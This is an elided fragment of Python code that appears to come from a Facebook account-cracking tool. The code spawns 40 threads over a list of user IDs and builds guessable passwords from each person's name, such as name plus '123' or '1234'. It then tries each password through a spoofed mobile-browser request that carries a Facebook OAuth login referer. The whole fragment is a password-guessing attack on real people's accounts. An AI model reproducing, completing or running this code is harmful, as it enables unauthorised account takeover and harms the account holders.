...
def mail():
    ...
    with tred(max_workers=40) as Asdel_xd:
        ...
        for number in idf:
            ...
            pwv= [first+last,first+' '+last,last,first+number,first+'123',first+'1234'] 
...
def md1(idf,pwv):
  ...
  for pw in pwv:
    try:
      ...
      "user-agent": ua, #'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
      "accept": "*/*",
      "x-requested-with": "Linux",
      "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124.0.0.0", "Not;A=Brand";v="99"',
      ...
      "sec-fetch-user": "?1",
      "referer": "https://mbasic.facebook.com/dialog/oauth?response_type=code&client_id=2076461462396807&redirect_uri=https%3A%2F%2Fduniagames.co.id%2Fnew-callback&scope=public_profile%2Cemail&code_challenge=Yqn9YmMbIY9awk-vWUaq_BuuPrndLEOUQXVYSH1Rleo&code_challenge_method=S256&state=2t0u9qzy4ubndt6ek29y6n1obo9mojr&ret=login&fbapp_pres=0&logger_id=d614149f-136e-431f-babf-db7f365bce91&tp=unspecified",
      "accept-encoding": "gzip, deflate br",
      "accept-language": "en-MA,en;q=0.9,fr-MA;q=0.8,fr;q=0.7,en-GB;q=0.6,en-US;q=0.5"}
